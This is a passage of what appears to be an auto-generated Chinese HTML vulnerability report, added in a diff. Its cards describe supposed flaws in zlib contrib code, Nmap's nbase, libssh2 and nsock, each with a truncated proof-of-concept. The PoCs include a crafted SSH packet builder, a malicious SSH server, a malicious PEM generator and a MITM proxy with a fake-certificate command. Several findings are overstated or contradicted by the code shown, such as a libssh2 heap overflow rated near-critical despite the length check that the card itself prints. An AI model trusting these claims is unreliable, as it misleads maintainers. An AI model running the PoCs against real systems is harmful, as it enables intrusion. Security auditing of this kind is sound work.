+                <p><strong>判断理由:</strong> 当输入为奇数个十六进制字符时，第二个getchar()会返回EOF（-1），将其强制转换为char后赋值给hexStr[1]会导致hexStr内容异常。更严重的是，如果输入流在读取第二个字符时遇到EOF，后续的strtol会解析未初始化的hexStr[0]和EOF值，可能导致未定义行为。</p>
+                <p><strong>影响分析:</strong> 当输入为奇数个十六进制字符时，第二个getchar()返回EOF(-1)，强制转换为char后hexStr[1]被赋值为0xFF（假设char为有符号类型）。随后strtol解析包含0xFF的字符串，可能导致：1) 解析出错误的字节值；2) 访问未初始化的内存（hexStr[0]可能未初始化）；3) 程序崩溃或产生未定义行为。在特定环境下，攻击者可能利用此漏洞造成信息泄露或拒绝服务。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 概念验证代码
+# 漏洞：libz/contrib/puff/bin-writer.c 中的缓冲区溢出/越界读取
+# 当输入为奇数个十六进制字符时触发
+
+echo "=== 漏洞 VULN-6234FC01 概念验证 ==="
+echo ""
+
+# 方法1：直接输入奇数个十六进制字符（无分隔符）
+echo "方法1：输入奇数个十六进制字符（如 'A' 后直接 EOF）"
+echo -n "A" | ./bin-writer 2>&1 || echo "程序异常退出或产生未定义行为"
+echo ""
+
+# 方法2：输入奇数个十六进制字符后跟分隔符
+echo "方法2：输入 'A '（一个十六进制字符后跟空格）"
+echo -n "A " | ./bin-writer 2>&1 || echo "程序异常退出或产生未定义行为"
+echo ""
+
+# 方法3：使用Python生成精确的PoC输入
+echo "方法3：使用Python生成PoC输入"
+python3 -c "
+# 仅供研究使用
+import sys
+
+# 生成奇数个十六进制字符（如 </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-0909397C - 缓冲区溢出</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libz/contrib/iostream2/zstream.h:107</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>inline izstream& operator>(izstream& zs, char* x) {
+    zstringlen len(zs);
+    ::gzread(zs.fp(), x, len.value());
+    x[len.value()] = '\0';
+    return zs;
+}</code></pre>
+                <p><strong>数据流:</strong> 从压缩文件读取长度值(len) -> 使用该长度从文件读取数据到缓冲区x -> 在x[len.value()]处写入null终止符</p>
+                <p><strong>判断理由:</strong> 该函数从压缩文件中读取一个长度值，然后根据该长度读取数据到用户提供的缓冲区x中。但函数没有检查缓冲区x的大小是否足够容纳len.value()字节的数据。如果攻击者构造一个恶意压缩文件，其中包含一个非常大的长度值，会导致缓冲区溢出，覆盖相邻内存区域。这是一个典型的基于长度的缓冲区溢出漏洞。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 程序崩溃(DoS)；2) 覆盖栈上的返回地址，实现代码执行；3) 覆盖关键数据结构，导致信息泄露或权限提升。由于该漏洞位于zlib库的贡献代码中，可能被多个使用zlib的应用程序间接使用，影响范围可能较广。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供安全研究使用
+ * 漏洞: libz/contrib/iostream2/zstream.h 中的缓冲区溢出
+ * 文件: zstream_poc.cpp
+ * 编译: g++ -o zstream_poc zstream_poc.cpp -lz
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <zlib.h>
+
+/*
+ * 模拟zstream.h中的漏洞函数
+ * 注意: 此代码仅用于演示漏洞原理
+ */
+
+// 模拟zstringlen结构
+class zstringlen {
+public:
+    zstringlen() : val(0) {}
+    zstringlen(size_t v) : val(v) {}
+    size_t value() const { return val; }
+    void set_value(size_t v) { val = v; }
+private:
+    size_t val;
+};
+
+// 模拟</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-B5AD63B1 - 内存泄漏</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libz/examples/zran.c:100</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>next->window = malloc(next->dict);
+if (next->window == NULL)
+    return NULL;</code></pre>
+                <p><strong>数据流:</strong> 在 add_point 函数中，如果 malloc 分配 window 失败，函数返回 NULL，但之前已经成功分配了 index->list 和 index 结构体。</p>
+                <p><strong>判断理由:</strong> 当 malloc(next->dict) 失败时，函数直接返回 NULL，但此时 index->have 已经递增，index->list 已经 realloc 成功。调用者无法知道部分分配已经完成，导致已分配的内存无法被释放，造成内存泄漏。</p>
+                <p><strong>影响分析:</strong> 该漏洞导致在内存分配失败时，已分配的内存（index->list和之前的window）无法被释放，造成内存泄漏。长期运行或多次触发可导致服务内存耗尽，影响系统稳定性。虽然漏洞严重性为medium，但在资源受限的环境或高并发场景下可能被利用进行拒绝服务攻击。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-B5AD63B1 - Memory Leak in add_point()
+ * 仅供研究使用
+ *
+ * 该PoC通过构造一个内存分配失败场景，触发add_point函数中的内存泄漏。
+ * 当malloc(next->dict)失败时，之前realloc成功的index->list和已递增的index->have无法被释放。
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <setjmp.h>
+#include <dlfcn.h>
+
+/* 模拟zran.h中的类型定义 */
+typedef struct {
+    off_t in;
+    off_t out;
+    off_t beg;
+    unsigned char *window;
+} point_t;
+
+typedef struct deflate_index {
+    int version;
+    int mode;
+    off_t length;
+    off_t </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-AABA4701 - 不安全的种子生成</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nbase/nbase_rnd.c:100</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>struct timeval *tv = (struct timeval *)seed;
+int *pid = (int *)(seed + sizeof(*tv));
+gettimeofday(tv, NULL);
+*pid = getpid();</code></pre>
+                <p><strong>数据流:</strong> seed数组 -> gettimeofday()填充时间 -> getpid()填充PID -> 作为熵源传递给nrand_addrandom()</p>
+                <p><strong>判断理由:</strong> 在没有/dev/urandom或/dev/arandom的系统上，种子仅由当前时间（微秒级）和进程ID组成。这种熵源非常有限且可预测，攻击者可以通过猜测时间窗口和PID来预测随机数序列。时间精度通常只有微秒级，PID范围有限，组合起来提供的熵值远低于安全要求。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者在缺乏系统熵源的环境下预测Nmap生成的随机数序列。具体影响包括：1) TCP序列号预测 - 可导致TCP会话劫持和中间人攻击；2) DNS事务ID预测 - 可导致DNS缓存投毒；3) 端口号预测 - 可绕过防火墙规则；4) 其他安全协议中的随机数预测。由于Nmap常用于网络安全扫描和渗透测试，其随机数可预测性将严重影响依赖随机数的安全功能。在嵌入式系统、IoT设备、容器环境等缺乏硬件熵源的场景中，该漏洞的利用难度较低，影响范围广泛。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-AABA4701 - Nmap nbase_rnd.c 不安全的种子生成
+
+仅供研究使用 (For Research Purposes Only)
+
+该PoC演示如何利用gettimeofday()+getpid()作为唯一熵源的可预测性，
+在缺乏/dev/urandom的系统上预测Nmap生成的随机数序列。
+"""
+
+import os
+import sys
+import time
+import struct
+import ctypes
+
+# 模拟nrand_addrandom的种子生成逻辑
+# 原始C代码：
+#   struct timeval *tv = (struct timeval *)seed;
+#   int *pid = (int *)(seed + sizeof(*tv));
+#   gettimeofday(tv, NULL);
+#   *pid = getpid();
+
+def predict_seed(target_time_usec=None, target_pid=None):
+</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-CEBAEC9B - 静态变量线程不安全</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nbase/nbase_rnd.c:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static nrand_h state;
+static int state_init = 0;
+if (!state_init) {
+  nrand_init(&state);
+  state_init = 1;
+}</code></pre>
+                <p><strong>数据流:</strong> 静态变量state和state_init在多线程环境下共享</p>
+                <p><strong>判断理由:</strong> get_random_bytes()函数使用静态变量存储随机数生成器状态，但没有提供任何线程同步机制。在多线程环境下，多个线程同时调用该函数会导致竞态条件，可能破坏内部状态（如i、j指针和s盒），导致生成可预测的随机数或程序崩溃。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者在多线程环境下利用竞态条件破坏ARC4随机数生成器的内部状态（i、j指针和s盒）。成功利用后，随机数生成器可能产生可预测的随机数序列，从而破坏依赖随机数的安全机制（如TCP序列号、端口随机化、DNS事务ID等）。在极端情况下，可能导致程序崩溃或生成弱随机数，使nmap的扫描结果可被预测或操纵。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-CEBAEC9B - Static variable thread safety issue in nbase_rnd.c
+ * 
+ * 仅供研究使用 (For research purposes only)
+ * 
+ * 编译: gcc -pthread -o poc_nbase_rnd poc_nbase_rnd.c
+ * 运行: ./poc_nbase_rnd
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+#include <string.h>
+#include <unistd.h>
+
+/* 模拟nbase_rnd.c中的数据结构 */
+struct nrand_handle {
+    unsigned char i, j, s[256], *tmp;
+    int tmplen;
+};
+typedef struct nrand_handle nrand_h;
+
+/* 模拟有问题的静态变量（无锁保护） */
+static nrand_h state;
+st</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-CD6887C3 - 缓冲区溢出 - 字符串复制未检查长度</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nbase/getnameinfo.c:99</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>Strncpy(host, he->h_name, hostlen);</code></pre>
+                <p><strong>数据流:</strong> 用户提供的sockaddr结构体 -> gethostbyaddr() -> he->h_name -> Strncpy()到host缓冲区</p>
+                <p><strong>判断理由:</strong> gethostbyaddr返回的主机名he->h_name可能超过hostlen长度。Strncpy在源字符串长度>=hostlen时不会添加null终止符，导致host缓冲区可能不是以null结尾的字符串，后续使用该缓冲区的操作可能导致缓冲区溢出或信息泄露。</p>
+                <p><strong>影响分析:</strong> 该漏洞可导致缓冲区溢出和信息泄露。当DNS返回的主机名超过hostlen时，Strncpy不会添加null终止符，导致host缓冲区成为非null结尾字符串。后续使用该缓冲区的字符串操作（如strlen、strcpy、printf等）可能读取超出缓冲区边界的数据，导致：1) 信息泄露 - 读取栈上敏感数据；2) 缓冲区溢出 - 后续字符串复制操作可能覆盖相邻内存区域；3) 潜在代码执行 - 在特定条件下可能被利用实现任意代码执行。漏洞影响Nmap软件包中getnameinfo函数的正常使用，当用户执行网络扫描时可能被触发。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-CD6887C3 - Nmap getnameinfo buffer overflow
+ * 仅供研究使用 - Do not use for malicious purposes
+ *
+ * 此PoC演示了如何通过控制DNS响应中的主机名长度来触发
+ * getnameinfo()函数中的Strncpy缓冲区溢出漏洞
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+
+/* 模拟目标缓冲区大小，与nmap中典型使用一致 */
+#define HOST_BUFFER_SIZE 256
+
+/*
+ * 漏洞触发演示函数
+ * 模拟nmap中getnameinfo的调用方式
+ */
+void trigger_vulnerability(const char *long_hostname) {
+    c</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #28a745;">
+                <h3>VULN-6C282B2C - 不安全的类型转换</h3>
+                <span class="severity" style="background:#28a745;color:white;padding:2px 8px;border-radius:3px;">LOW</span>
+                <p><strong>文件:</strong> libssh2/os400/ccsid.c:96</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>olen = sizeof(buf - olen);</code></pre>
+                <p><strong>数据流:</strong> sizeof(buf - olen)计算的是指针差值的字节大小，而不是缓冲区剩余大小</p>
+                <p><strong>判断理由:</strong> sizeof(buf - olen)实际上计算的是指针运算结果的类型大小（在64位系统上通常是8字节），而不是预期的缓冲区剩余字节数。这会导致terminator_size函数返回错误的值，可能影响后续的内存分配和转换操作。正确的写法应该是sizeof(buf) - olen。</p>
+                <p><strong>影响分析:</strong> 该漏洞导致terminator_size函数返回错误的值（在64位系统上返回8，而不是正确的4）。虽然这个错误值比预期大，不会直接导致缓冲区溢出，但会造成以下影响：1) convert_ccsid函数会分配比实际需要更大的缓冲区，造成内存浪费；2) 在某些边界情况下，如果后续代码依赖terminator_size的精确返回值进行逻辑判断，可能导致逻辑错误；3) 在内存受限的嵌入式环境中，额外的内存分配可能触发OOM条件。总体而言，这是一个低危漏洞，主要影响是内存使用效率降低和潜在的逻辑错误。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞：libssh2/os400/ccsid.c 第96行不安全的类型转换
+ * 
+ * 编译：gcc -o poc_terminator_size poc_terminator_size.c -lssh2
+ * 或独立编译测试：gcc -o poc_terminator_size poc_terminator_size.c
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+/* 模拟libssh2中的MAX_CHAR_SIZE定义 */
+#define MAX_CHAR_SIZE   4
+
+/* 
+ * 模拟有漏洞的terminator_size函数
+ * 注意：这是对原始漏洞代码的精确模拟，用于演示问题
+ */
+static ssize_t
+vulnerable_terminator_size(unsigned short ccsid)
+{
+    char buf[MAX_CHAR_SIZE];
+    size_t olen;
+    
+    /* </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-64DBC485 - 缓冲区溢出/越界读取</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libssh2/src/userauth.c:120</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>banner_len = _libssh2_ntohu32(session->userauth_list_data + 1);
+if(banner_len > session->userauth_list_data_len - 5) {
+    LIBSSH2_FREE(session, session->userauth_list_data);
+    session->userauth_list_data = NULL;
+    _libssh2_error(session, LIBSSH2_ERROR_OUT_OF_BOUNDARY,
+                   "Unexpected userauth banner size");
+    return NULL;
+}
+session->userauth_banner = LIBSSH2_ALLOC(session, banner_len + 1);
+if(!session->userauth_banner) {
+    ...
+}
+memcpy(session->userauth_banner, session->userauth_list_data + 5,
+        banner_len);</code></pre>
+                <p><strong>数据流:</strong> 从网络接收的session->userauth_list_data数据 -> 解析banner_len字段 -> 检查banner_len是否大于data_len-5 -> 分配banner_len+1内存 -> memcpy复制banner_len字节</p>
+                <p><strong>判断理由:</strong> 虽然代码检查了banner_len是否大于data_len-5，但没有检查banner_len是否为0或负数。_libssh2_ntohu32返回的是无符号32位整数，但banner_len声明为unsigned int。如果banner_len为0，则分配1字节内存并复制0字节，这本身没问题。但更严重的是，如果banner_len非常大（接近UINT_MAX），banner_len+1会溢出为0，导致分配0字节内存，后续memcpy会写入大量数据造成堆缓冲区溢出。这是一个经典的整数溢出漏洞。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 堆缓冲区溢出，可能覆盖相邻内存区域；2) 远程代码执行 (RCE)，攻击者可控制程序执行流；3) 服务崩溃 (DoS)，导致SSH服务不可用；4) 信息泄露，可能读取堆上敏感数据。由于libssh2被广泛用于SSH客户端和服务器实现，影响范围广泛。CVSS评分预计为9.8 (Critical)，因为攻击复杂度低，无需认证，且可远程触发。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for libssh2 integer overflow in userauth banner parsing (VULN-64DBC485)
+仅供研究使用 - Research Purpose Only
+
+该PoC演示如何通过构造恶意的SSH USERAUTH_BANNER消息触发整数溢出漏洞。
+当banner_len设置为0xFFFFFFFF时，banner_len+1会回绕为0，
+导致分配0字节内存，后续memcpy复制大量数据造成堆缓冲区溢出。
+"""
+
+import socket
+import struct
+import sys
+import time
+
+# SSH协议常量
+SSH_MSG_USERAUTH_BANNER = 53
+SSH_MSG_USERAUTH_FAILURE = 52
+SSH_MSG_USERAUTH_SUCCESS = 51
+
+# 最大包长度
+MAX_PACKET_LEN = 35000
+
+def create_ssh_packet(payload):
+    """创建SSH传输层包"""</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-B7DCF18A - 整数溢出/缓冲区溢出</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libssh2/src/packet.c:97</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if((listn->port == (int) listen_state->port) &&
+    (strlen(listn->host) == listen_state->host_len) &&
+    (memcmp(listn->host, listen_state->host,
+            listen_state->host_len) == 0)) {</code></pre>
+                <p><strong>数据流:</strong> listen_state->host_len可能被截断为较小的值，但listen_state->host指向的数据可能更大。memcmp使用截断后的长度进行比较，可能导致比较不完整。</p>
+                <p><strong>判断理由:</strong> 由于host_len可能被截断，memcmp只比较了部分数据。攻击者可以构造一个以合法host开头但包含额外数据的数据包，绕过host匹配检查。同时，strlen(listn->host)与截断后的host_len比较可能通过，但实际数据更长。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致SSH端口转发的主机名验证被绕过。攻击者可以构造恶意数据包，使其通过主机名匹配检查，从而将连接转发到非预期的目标主机。这可能导致中间人攻击、数据泄露或绕过访问控制。由于漏洞位于核心库文件，影响范围包括所有使用libssh2的应用程序，如curl、git等。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-B7DCF18A - libssh2整数溢出导致主机名验证绕过
+仅供安全研究使用，请勿用于非法用途
+"""
+
+import socket
+import struct
+import sys
+
+# 目标SSH服务器配置
+TARGET_HOST = "192.168.1.100"
+TARGET_PORT = 22
+
+# 合法的host前缀（与服务器上注册的listener匹配）
+LEGIT_HOST = b"allowed-host.example.com"
+
+# 构造超长host数据，利用整数截断
+# 当temp_len > UINT32_MAX (4294967295) 时，host_len被截断
+# 我们需要构造一个长度刚好使截断后的host_len等于LEGIT_HOST的长度
+# 例如：LEGIT_HOST长度 = 24
+# 我们需要 temp_len = UINT32_MAX + 24 + 1 = 4294967320
+# 这样截断后 host_len = 24
+
+# 构造payload
+EXTRA_</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-DFDEED07 - 缓冲区溢出 - 栈缓冲区读取越界</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libssh2/src/pem.c:131</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>memcpy(iv, line + strlen(method->pem_annotation) + 1,
+       2*method->iv_len);</code></pre>
+                <p><strong>数据流:</strong> 从文件读取的line数据通过readline()函数获取，然后根据method->pem_annotation计算偏移量，使用memcpy复制2*method->iv_len字节到iv缓冲区。iv缓冲区大小为LINE_SIZE(128)字节，但未对偏移量和复制长度进行边界检查。</p>
+                <p><strong>判断理由:</strong> iv缓冲区大小为LINE_SIZE(128)字节，但memcpy从line+strlen(method->pem_annotation)+1位置复制2*method->iv_len字节。如果method->iv_len较大（例如AES-256-GCM的iv_len为12，但2*12=24字节仍在安全范围内），或者line字符串长度不足，可能导致读取越界。更严重的是，如果pem_annotation匹配但line字符串实际长度小于strlen(method->pem_annotation)+1+2*method->iv_len，将导致栈缓冲区读取越界。</p>
+                <p><strong>影响分析:</strong> 该漏洞为栈缓冲区读取越界漏洞，影响libssh2库的PEM文件解析功能。攻击者通过构造特殊的PEM文件，可以触发从栈缓冲区之外读取内存数据。具体影响包括：1) 信息泄露：读取的越界数据可能包含栈上的敏感信息（如其他函数的局部变量、返回地址等），这些数据被当作IV使用后，可能通过后续的加密操作或错误信息被泄露给攻击者。2) 程序崩溃：在特定条件下，读取越界数据可能导致后续处理异常，引发程序崩溃（DoS）。3) 由于该代码位于libssh2库的核心功能中，影响范围广泛，包括使用libssh2的SSH客户端、服务器及其他网络应用。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-DFDEED07 - libssh2 PEM parsing stack buffer read out-of-bounds
+仅供研究使用 (For research purposes only)
+"""
+
+import struct
+import sys
+
+# 构造一个恶意的PEM文件，触发栈缓冲区读取越界
+# 漏洞位于 libssh2/src/pem.c:131
+# memcpy(iv, line + strlen(method->pem_annotation) + 1, 2*method->iv_len);
+# 当line字符串长度小于strlen(method->pem_annotation) + 1 + 2*method->iv_len时
+# 会发生从line缓冲区之外的栈内存读取数据
+
+def generate_malicious_pem(output_file):
+    """
+    生成一个恶意的PEM文件，触发栈缓冲区读取越界
+    
+    利用原理：
+    1. 使用一个有效的</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-81B62577 - 未检查的缓冲区长度/越界读取</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libssh2/src/userauth_kbd_packet.c:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>decoded.data = session->userauth_kybd_data;
+    decoded.dataptr = session->userauth_kybd_data;
+    decoded.len = session->userauth_kybd_data_len;
+
+    if(session->userauth_kybd_data_len < 17) {
+        _libssh2_error(session, LIBSSH2_ERROR_BUFFER_TOO_SMALL,
+                       "userauth keyboard data buffer too small "
+                       "to get length");
+        return -1;
+    }</code></pre>
+                <p><strong>数据流:</strong> session->userauth_kybd_data和session->userauth_kybd_data_len来自外部网络数据包，仅检查了最小长度17字节，但后续解析多个字符串字段时未充分验证剩余缓冲区长度。</p>
+                <p><strong>判断理由:</strong> 代码仅检查了总长度至少17字节，但后续需要解析多个字符串字段（name, instruction, language tag, num-prompts, 以及每个prompt的text和echo）。如果数据包长度不足，_libssh2_get_string和_libssh2_copy_string等函数可能读取超出缓冲区边界的数据，导致信息泄露或崩溃。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可能导致：1) 信息泄露：越界读取可能读取到libssh2会话对象中其他敏感数据，如其他认证信息、密钥材料或内存中的其他数据；2) 拒绝服务：越界读取可能导致段错误（SIGSEGV），使客户端崩溃；3) 潜在代码执行：在特定内存布局下，精心构造的越界读取可能配合其他漏洞实现代码执行。由于该漏洞位于用户认证处理路径中，在SSH连接建立阶段即可触发，无需完整认证。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-81B62577 - libssh2 keyboard-interactive userauth buffer overread
+仅供研究使用 (For research purposes only)
+
+该PoC模拟一个恶意SSH服务器，发送精心构造的SSH_MSG_USERAUTH_INFO_REQUEST消息，
+触发libssh2客户端中的越界读取漏洞。
+"""
+
+import socket
+import struct
+import threading
+import sys
+
+# SSH协议常量
+SSH_MSG_USERAUTH_INFO_REQUEST = 60
+
+class MaliciousSSHServer:
+    """模拟恶意SSH服务器，发送畸形keyboard-interactive认证数据包"""
+    
+    def __init__(self, host='0.0.0.0', port=2222):
+        self.host = host
+        self.</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-2988C60C - 整数溢出风险 - 端口转换</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nsock/src/proxy_socks4.c:67</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if (uri->port == -1)
+    proxy->port = DEFAULT_PROXY_PORT_SOCKS4;
+  else
+    proxy->port = (unsigned short)uri->port;</code></pre>
+                <p><strong>数据流:</strong> uri->port（可能为int类型）被强制转换为unsigned short。如果port值大于65535或为负数（除-1外），转换会导致截断/溢出。</p>
+                <p><strong>判断理由:</strong> 代码仅检查了-1（表示未指定端口），但未验证其他非法值。如果uri->port为65536，转换为unsigned short后变为0，可能导致连接到错误端口。</p>
+                <p><strong>影响分析:</strong> 该整数溢出漏洞允许攻击者通过提供超范围的端口值（>65535或负值），使SOCKS4代理连接到错误的端口。具体影响包括：1) 端口劫持：攻击者可以诱导代理连接到攻击者控制的端口（如端口0在某些系统上可能有特殊含义）；2) 服务混淆：原本应该连接到高端口服务的流量被重定向到低端口服务；3) 安全策略绕过：如果安全策略基于端口进行访问控制，攻击者可以通过溢出绕过限制；4) 信息泄露：可能将敏感流量发送到错误的服务，导致信息泄露。虽然漏洞严重性为中等，但在特定场景下可能被用于更复杂的攻击链。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-2988C60C - Integer Overflow in SOCKS4 Proxy Port Conversion
+仅供研究使用 (For Research Purposes Only)
+"""
+
+import socket
+import struct
+import sys
+
+# 模拟漏洞触发场景：通过构造超范围端口值
+# 漏洞点：nsock/src/proxy_socks4.c:67
+# proxy->port = (unsigned short)uri->port;
+# 当uri->port > 65535时，转换为unsigned short会发生截断
+
+class Socks4PoC:
+    def __init__(self, target_host, target_port, overflow_port):
+        self.target_host = target_host
+        self.target_port = target_port
+        self.o</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-66B5F62A - 整数溢出/类型转换</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nsock/src/proxy_http.c:47</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if (uri->port == -1)
+    proxy->port = DEFAULT_PROXY_PORT_HTTP;
+  else
+    proxy->port = (unsigned short)uri->port;</code></pre>
+                <p><strong>数据流:</strong> 用户提供的端口号(uri->port)被强制转换为unsigned short类型。如果端口号大于65535或为负数，转换可能导致意外的端口值。</p>
+                <p><strong>判断理由:</strong> 将int类型强制转换为unsigned short可能导致数据截断。如果用户提供端口65536，转换后变为0；如果提供-1，转换后变为65535。虽然代码中检查了-1的情况，但其他负数或超大值未做校验，可能导致连接到错误的端口。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过提供超出unsigned short范围的端口号，使HTTP代理连接到非预期的端口。具体影响包括：1) 负端口(-2)被转换为65534，可能连接到系统高位端口；2) 超大端口(65536)被转换为0，可能连接到特权端口；3) 其他溢出值可导致连接到任意端口。这可能导致信息泄露、服务绕过或中间人攻击。虽然漏洞严重性为中等，但在特定场景下可能被用于更复杂的攻击链。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-66B5F62A - Integer overflow/truncation in proxy_http.c
+
+仅供研究使用 (For research purposes only)
+
+This PoC demonstrates how providing an out-of-range port number can cause
+unexpected port truncation, potentially connecting to a wrong port.
+"""
+
+import socket
+import sys
+
+# 模拟漏洞代码逻辑
+def vulnerable_port_conversion(port):
+    """
+    模拟 proxy_http.c 中的漏洞代码:
+    proxy->port = (unsigned short)uri->port;
+    
+    注意: 原始代码中 -1 被特殊处理为 DEFAULT_PROXY_PORT_HTTP (8080)
+    </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-E9DA4C43 - 缺少证书验证</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nsock/src/nsock_ssl.c:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>/* Initializes an Nsock pool to create SSL connections. This sets an internal
+ * SSL_CTX, which is like a template that sets options for all connections that
+ * are made from it. The connections made from this context will use only secure
+ * ciphers but no server certificate verification is done. Returns the SSL_CTX
+ * so you can set your own options. */</code></pre>
+                <p><strong>数据流:</strong> 注释明确说明'no server certificate verification is done'，表明SSL连接不验证服务器证书。</p>
+                <p><strong>判断理由:</strong> 不验证服务器证书意味着SSL/TLS连接容易受到中间人攻击。攻击者可以伪造服务器证书，拦截和篡改通信内容。虽然注释提到用户可以自行设置选项，但默认行为是不安全的。</p>
+                <p><strong>影响分析:</strong> 由于nsock库在默认情况下不验证服务器证书，攻击者可以轻松实施中间人攻击。攻击者可以：1) 拦截所有SSL/TLS加密通信，获取敏感信息如密码、令牌等；2) 篡改通信内容，注入恶意数据；3) 重放或修改请求/响应。影响范围包括所有依赖nsock库进行SSL通信的应用程序，特别是nmap等安全工具，可能导致扫描结果被篡改或敏感信息泄露。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC: Nsock SSL证书验证缺失 - 中间人攻击演示
+仅供安全研究使用，请勿用于非法用途。
+"""
+
+import socket
+import ssl
+import threading
+import sys
+
+# 攻击者控制的伪造证书（自签名）
+FAKE_CERT = {
+    'certfile': 'fake_server.crt',
+    'keyfile': 'fake_server.key'
+}
+
+# 生成伪造证书的命令（仅供测试环境使用）：
+# openssl req -x509 -newkey rsa:2048 -keyout fake_server.key -out fake_server.crt -days 365 -nodes -subj "/CN=attacker.com"
+
+class MITMProxy:
+    """
+    模拟中间人攻击代理
+    当目标使用nsock且未启用证书验证时，此代理可拦截并篡改通信
+    """
+    
+    def __init__(self, li</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-C2651E2C - 静态缓冲区竞争条件</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
